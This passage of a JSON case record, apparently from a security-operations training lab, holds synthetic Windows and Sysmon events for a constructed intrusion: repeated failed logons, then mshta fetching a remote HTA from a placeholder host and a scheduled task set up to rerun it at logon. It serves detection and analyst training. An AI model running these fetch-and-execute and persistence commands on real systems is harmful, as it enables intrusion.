verdict.","sequence":5,"snapshot":{"created_at":"2026-10-04T15:26:09.502182+00:00","evidence":[{"event_uid":"f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":100,"timestamp":"2026-09-03T10:00:00Z"},"source_line":1,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":101,"timestamp":"2026-09-03T10:00:01Z"},"source_line":2,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":102,"timestamp":"2026-09-03T10:00:02Z"},"source_line":3,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":103,"timestamp":"2026-09-03T10:00:03Z"},"source_line":4,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":104,"timestamp":"2026-09-03T10:00:04Z"},"source_line":5,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonType":"3","TargetDomainName":"LAB","TargetLogonId":"0x42","TargetUserName":"analyst.lab"},"event_id":4624,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":105,"timestamp":"2026-09-03T10:00:05Z"},"source_line":6,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"mshta.exe https://payload.example.invalid/stage.hta","Image":"C:\\Windows\\System32\\mshta.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessId":"4001","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":107,"timestamp":"2026-09-03T10:00:07Z"},"source_line":2,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"DestinationIp":"198.51.100.20","DestinationPort":"443","Image":"C:\\Windows\\System32\\mshta.exe","Initiated":"true","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","Protocol":"tcp"},"event_id":3,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":108,"timestamp":"2026-09-03T10:00:08Z"},"source_line":3,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"","Image":"C:\\Windows\\System32\\schtasks.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessGuid":"{582945ac-4be3-5081-ab8d-39ed62d01823}","ProcessId":"4002","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":109,"timestamp":"2026-09-03T10:00:09Z"},"source_line":4,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"f73d5d23fb0a86f4c55601856cb29ea7a871315700e535e100b6c12b5d087fa5","original":{"channel":"Security","event_data":{"SubjectDomainName":"LAB","SubjectLogonId":"0x42","SubjectUserName":"analyst.lab","TaskContent":"<Task><Actions><Exec><Command>mshta.exe</Command></Exec></Actions></Task>","TaskName":"\\LabUpdater"},"event_id":4698,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":110,"timestamp":"2026-09-03T10:00:10Z"},"source_line":7,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"}],"id":"cb9fe31a1d974805b59694f462ec2be7","revision":5,"severity":"high","source_case":"case-005","status":"escalated","title":"Constructed case: network logon followed by mshta and task creation","updated_at":"2026-10-04T15:29:43.709552+00:00","verdict":null}},"previous_sha256":"da8f73bb82f4c89f25bc2f93f0c1c397058754eee5d76ba3b769a26b95bcfd66","sha256":"00e46dec31b9853037a240973b56ac6fb3d74463af08ff7a3898d99a45f51a92"}]
